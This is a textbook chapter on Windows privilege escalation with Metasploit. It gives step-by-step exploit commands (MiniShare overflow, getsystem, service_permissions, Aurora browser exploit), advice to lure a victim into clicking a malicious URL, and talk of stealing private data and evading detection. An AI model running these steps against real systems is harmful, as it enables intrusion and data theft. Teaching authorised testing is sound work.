- en: Chapter 8. Post Exploitation – Privilege Escalation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous chapter we went through the post-exploitation techniques. Post
    exploitation is divided into five different phases. This chapter will give a deep
    understanding of the first phase of post exploitation, which is Privilege Escalation.
    We will be covering new techniques and tricks on how to escalate our privileges
    once we have gained access to the system.
  prefs: []
  type: TYPE_NORMAL
- en: Understanding Privilege Escalation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Privilege Escalation in simple terms is gaining elevated privileges to resources
    that are normally protected and whose access is denied to normal or unauthorized
    users. Through escalated privileges, a malicious user may perform unauthorized
    actions and cause harm to the computer or the whole network. Simple examples of
    things you can do after privilege escalation are installing malicious software
    for unethical uses, deleting user files, denying resources to a particular user,
    and viewing private information. It may usually occur by compromising a system
    using an exploit based on vulnerability. This security misconfiguration or weakness
    may cause the security perimeter or the authentication to be bypassed and hence
    achieve privilege escalation.
  prefs: []
  type: TYPE_NORMAL
- en: 'Privilege escalation is broadly divided into two major forms:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Vertical Privilege Escalation**: In this escalation of privileges, a lower
    privileged user or application may access functions that are reserved only for
    authorized or administrative users. This feature is also known as privilege elevation.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Horizontal Privilege Escalation**: This escalation usually happens on a horizontal
    scale with respect to user rights. A normal user accessing the resources reserved
    for another normal user. This again is escalation of some other person''s resources,
    as technically only he should have privileges over his resources.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: There can be escalation scenarios due to multiple reasons – network intrusion,
    vulnerability exposure, unmanaged accounts, security from obscurity, and others.
    The approach followed is usually logging in and trying to get some basic information
    about the computer, something similar to the information-gathering scenario. Then
    the attacker may try to get hold of private information or maybe some user credentials
    that may be linked to some important documents.
  prefs: []
  type: TYPE_NORMAL
- en: If we talk about Metasploit, running client-side exploits gives us the session
    with only limited user rights. This may severely limit the attacker from compromising
    the victim machine to the level he wants; for example, he may not be able to dump
    password hashes, make changes in the system settings, or install backdoor Trojans.
    Through very powerful scripts in Metasploit, such as getsystem, we may be able
    to get system-level permissions on the root system.
  prefs: []
  type: TYPE_NORMAL
- en: Exploiting the victim's system
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Now we will start the tutorial phase of privilege escalation. Here we are going
    to exploit the victim's system by running a buffer overflow exploit in a small
    program called Mini-share. Mini-share is free file-sharing software. It is free
    web server software for Microsoft Windows. It is a quick and easy way to share
    files if you have web hosting. Now open `msfconsole` and type in `use exploit/windows/http/minishare_get_overflow`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_01.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After that, type in `show options` to see in detail all the options that we
    have to set in the exploit.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now set all the options that are required; as we can see in the preceding screenshot,
    `RHOST` is required. The `RHOST` option refers to the remote host address, which
    is the target IP address. Type in `set RHOST <Victim IP>`; for example, here we
    are using `set RHOST 192.168.0.102`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_03.jpg)'
  prefs: []
  type: TYPE_IMG
- en: The second option that is required is `RPORT`. The `RPORT` option refers to
    the remote port address, which is the target port number. Type in `set RPORT <Victim
    port>`; for example, here we are using `set RPORT 80`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now select the target system type. Type in `show targets` and it will show us
    all the vulnerable target operating systems.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_05.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now select the target according to your victim's system. Here we are selecting
    target 3\. So we type in `set TARGET 3`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_06.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now it is time to exploit the target. So we type in `exploit`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_07.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see that after exploiting the victim's machine we have a `Meterpreter`
    session. Let us have a sneak peek into the victim's system. To get the user ID,
    type in `getuid`. We see from the following screenshot that the user ID is `NT
    AUTHORITY\SYSTEM`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_08.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After that, we run `getsystem -h` for escalating the privileges in the victim's
    system.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_09.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'We can see in the previous screenshot that running `getsystem –h`, gives us
    a bunch of options for privilege escalation. The first option is `0 : All techniques
    available`, which uses all techniques as default for escalating the privilege.'
  prefs: []
  type: TYPE_NORMAL
- en: 'The terms used in the options for privilege escalation are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Named Pipe**: It is a mechanism that enables inter-process communication
    for applications to occur locally or remotely. The application that creates the
    pipe is known as the pipe server, and the application that connects to the pipe
    is known as the pipe client.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Impersonation**: It is the ability of a thread to execute in a security context
    that is different from that of the process that owns the thread. Impersonation
    enables the server thread to perform actions on behalf of the client, but within
    the limits of the client''s security context. The problem arises when the client
    has more rights than the server. Every user of an operating system is provided
    a unique token ID. This ID is used to check the permission levels of various users
    of the system.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Token Duplication**: It works by copying the token ID of a higher privilege
    user by a low privilege user. The lower privilege user then behaves in a similar
    manner as the higher privilege user and acquires all the rights and authorities
    as those of the higher privilege user.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**KiTrap0D**: It was released in early 2010 and affected nearly every operating
    system that Microsoft had made up till then. When access to 16-bit applications
    is enabled on a 32-bit platform, it does not validate certain BIOS calls properly,
    which allows local users to gain privileges to improperly handled exceptions involving
    the #GP trap handler (nt!KiTrap0D), aka Windows Kernel Exception Handler Vulnerability,
    by crafting a VDM_TIB data structure in the Thread Environment Block (TEB).'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Let us use the first option with all techniques available by typing in `getsystem
    -t 0`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see the message after running the command `...got system (via technique
    1).`. Now we check the process list by typing in the `ps` command.
  prefs: []
  type: TYPE_NORMAL
- en: '![Exploiting the victim''s system](img/3589OS_08_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Privilege escalation by post exploitation
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Now we will show another technique for privilege escalation – using post-exploitation
    modules. This module uses the built-in `getsystem` command to escalate the current
    session to the SYSTEM account from an administrator user account. When we get
    a `Meterpreter` session, type in `run post/windows/escalate/getsystem`. This module
    will automatically escalate the administrator privileges.
  prefs: []
  type: TYPE_NORMAL
- en: '![Privilege escalation by post exploitation](img/3589OS_08_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now we are going to use another post-exploitation script for local privilege
    escalation. This module exploits the existing administrative privileges to obtain
    a SYSTEM session. If it fails in the first instance, the module inspects the existing
    services and looks for insecure file permissions that are vulnerable to an attack.
    After that, it attempts to restart the replaced vulnerable service to run the
    payload. Hence a new session gets created on a successful exploit.
  prefs: []
  type: TYPE_NORMAL
- en: Type in `run post/windows/escalate/service_permissions`; it will open another
    `Meterpreter` session.
  prefs: []
  type: TYPE_NORMAL
- en: '![Privilege escalation by post exploitation](img/3589OS_08_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Just try a different exploit for compromising the target system, and after that
    escalate the administrator privileges. Type in `use exploit/windows/browser/ms10_002_aurora`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Privilege escalation by post exploitation](img/3589OS_08_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Now type in `show options` to see in detail all the options that we have to
    set in the exploit.
  prefs: []
  type: TYPE_NORMAL
- en: '![Privilege escalation by post exploitation](img/3589OS_08_15.jpg)'
  prefs: []
  type: TYPE_IMG
- en: After this, set all the options that are required as shown in the preceding
    screenshot. The `SRVHOST` option refers to the local host address to listen on.
    Type in `set SRVHOST <Victim IP>`; for example, here we are using `set SRVHOST
    192.168.0.109`.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, we exploit the target by typing in `exploit`.
  prefs: []
  type: TYPE_NORMAL
- en: '![Privilege escalation by post exploitation](img/3589OS_08_16.jpg)'
  prefs: []
  type: TYPE_IMG
- en: We can see a URL created by Metasploit. Now we just need to give this URL to
    the victim and lure him to click on it. After opening this URL in Internet Explorer,
    the victim will get a `Meterpreter` session and after that you may go ahead with
    privilege escalation attacks.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter we learned on how to elevate our privileges once we have compromised
    a system. We used various scripts and post-exploitation modules to achieve this
    task. Our ultimate goal was to achieve the level of privileges of a system administrator
    so that we will be able to use the victim's machine as per our needs. We were
    successful in achieving this task and gained administrator privileges to the victim's
    machine. Only compromising the system will not achieve the ultimate goal; we need
    to be able to leak out a victim's private information or make brutal changes to
    his computer. The power of privilege escalation through Metasploit unlocks this
    power and helps us achieve our target. In the next chapter, we will move on to
    the next post-exploitation phase – clearing our tracks to save ourselves from
    getting caught once we have compromised a system.
  prefs: []
  type: TYPE_NORMAL
- en: References
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'The following are some helpful references that shed further light on some of
    the topics covered in this chapter:'
  prefs: []
  type: TYPE_NORMAL
- en: '[http://en.wikipedia.org/wiki/Privilege_escalation](http://en.wikipedia.org/wiki/Privilege_escalation)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.offensive-security.com/metasploit-unleashed/Privilege_Escalation](http://www.offensive-security.com/metasploit-unleashed/Privilege_Escalation)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://vishnuvalentino.com/tips-and-trick/privilege-escalation-in-metasploit-meterpreter-backtrack-5/](http://vishnuvalentino.com/%E2%80%A8tips-and-trick/privilege-escalation-in-metasploit-meterpreter-backtrack-5/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.redspin.com/blog/2010/02/18/getsystem-privilege-escalation-via-metasploit/](http://www.redspin.com/blog/2010/02/18/getsystem-privilege-escalation-via-metasploit/)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[http://www.securitytube.net/video/1188](http://www.securitytube.net/video/1188)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
